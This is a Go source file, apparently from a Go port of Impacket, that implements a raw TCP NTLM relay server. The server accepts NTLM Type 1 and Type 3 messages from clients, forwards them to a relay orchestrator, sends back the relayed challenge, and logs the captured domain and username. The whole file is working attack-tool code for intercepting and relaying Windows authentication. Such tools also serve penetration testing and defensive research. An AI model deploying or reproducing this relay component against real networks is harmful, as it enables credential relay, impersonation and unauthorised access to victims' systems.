package relay

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"

	"gopacket/internal/build"
)

// RAWRelayServer listens for incoming raw TCP connections and captures
// NTLM authentication using a simple length-prefixed wire format.
// Wire format (all lengths are 2-byte little-endian):
//
//	Client→Server: [2-byte LE len][NTLM Type1]
//	Server→Client: [2-byte LE len][NTLM Type2]
//	Client→Server: [2-byte LE len][NTLM Type3]
//	Server→Client: [2-byte LE len=1][1-byte bool success]
//
// Matches Impacket's rawrelayserver.py.
type RAWRelayServer struct {
	listenAddr string
	listener   net.Listener
	authCh     chan<- AuthResult
}

// NewRAWRelayServer creates a new RAW relay server.
func NewRAWRelayServer(listenAddr string) *RAWRelayServer {
	return &RAWRelayServer{listenAddr: listenAddr}
}

// Start begins listening for raw TCP connections, implements ProtocolServer.
func (s *RAWRelayServer) Start(resultChan chan<- AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}
	s.listener = ln
	s.authCh = resultChan

	log.Printf("[*] RAW relay server listening on %s", s.listenAddr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				if build.Debug {
					log.Printf("[D] RAW relay server: accept error: %v", err)
				}
				return
			}
			go s.handleConnection(conn)
		}
	}()

	return nil
}

// Stop closes the listener, implements ProtocolServer.
func (s *RAWRelayServer) Stop() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// recvAll reads exactly n bytes from conn.
func recvAll(conn net.Conn, n int) ([]byte, error) {
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func (s *RAWRelayServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[*] RAW: Incoming connection from %s", remoteAddr)

	// Step 1: Receive NTLM Type 1 (length-prefixed)
	lenBuf, err := recvAll(conn, 2)
	if err != nil {
		if build.Debug {
			log.Printf("[D] RAW relay server: failed to read Type1 length from %s: %v", remoteAddr, err)
		}
		return
	}
	type1Len := int(binary.LittleEndian.Uint16(lenBuf))
	if type1Len <= 0 || type1Len > 65535 {
		if build.Debug {
			log.Printf("[D] RAW relay server: invalid Type1 length %d from %s", type1Len, remoteAddr)
		}
		return
	}

	type1, err := recvAll(conn, type1Len)
	if err != nil {
		if build.Debug {
			log.Printf("[D] RAW relay server: failed to read Type1 from %s: %v", remoteAddr, err)
		}
		return
	}

	if build.Debug {
		log.Printf("[D] RAW relay server: received NTLM Type 1 (%d bytes) from %s", len(type1), remoteAddr)
	}

	// Create auth result and push to orchestrator
	auth := AuthResult{
		NTLMType1:  type1,
		SourceAddr: remoteAddr,
		ServerConn: conn,
		Type2Ch:    make(chan []byte, 1),
		Type3Ch:    make(chan []byte, 1),
		ResultCh:   make(chan bool, 1),
	}

	s.authCh <- auth

	// Step 2: Wait for Type 2 challenge from orchestrator
	type2, ok := <-auth.Type2Ch
	if !ok || type2 == nil {
		log.Printf("[-] RAW relay: no challenge received for %s", remoteAddr)
		return
	}

	// Send Type 2 back to client (length-prefixed)
	type2LenBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(type2LenBuf, uint16(len(type2)))
	if _, err := conn.Write(type2LenBuf); err != nil {
		if build.Debug {
			log.Printf("[D] RAW relay server: failed to send Type2 length to %s: %v", remoteAddr, err)
		}
		return
	}
	if _, err := conn.Write(type2); err != nil {
		if build.Debug {
			log.Printf("[D] RAW relay server: failed to send Type2 to %s: %v", remoteAddr, err)
		}
		return
	}

	if build.Debug {
		log.Printf("[D] RAW relay server: sent Type 2 challenge (%d bytes) to %s", len(type2), remoteAddr)
	}

	// Step 3: Receive NTLM Type 3 (length-prefixed)
	lenBuf, err = recvAll(conn, 2)
	if err != nil {
		if build.Debug {
			log.Printf("[D] RAW relay server: failed to read Type3 length from %s: %v", remoteAddr, err)
		}
		return
	}
	type3Len := int(binary.LittleEndian.Uint16(lenBuf))
	if type3Len <= 0 || type3Len > 65535 {
		if build.Debug {
			log.Printf("[D] RAW relay server: invalid Type3 length %d from %s", type3Len, remoteAddr)
		}
		return
	}

	type3, err := recvAll(conn, type3Len)
	if err != nil {
		if build.Debug {
			log.Printf("[D] RAW relay server: failed to read Type3 from %s: %v", remoteAddr, err)
		}
		return
	}

	domain, user := extractNTLMType3Info(type3)
	log.Printf("[*] RAW: NTLM Type 3 from %s\\%s @ %s", domain, user, remoteAddr)

	// Send Type 3 to orchestrator
	auth.Type3Ch <- type3

	// Step 4: Wait for result from orchestrator
	success := <-auth.ResultCh

	// Send result back to client: [2-byte len=1][1-byte bool]
	resultLenBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(resultLenBuf, 1)
	resultBuf := []byte{0}
	if success {
		resultBuf[0] = 1
	}
	conn.Write(resultLenBuf)
	conn.Write(resultBuf)
}
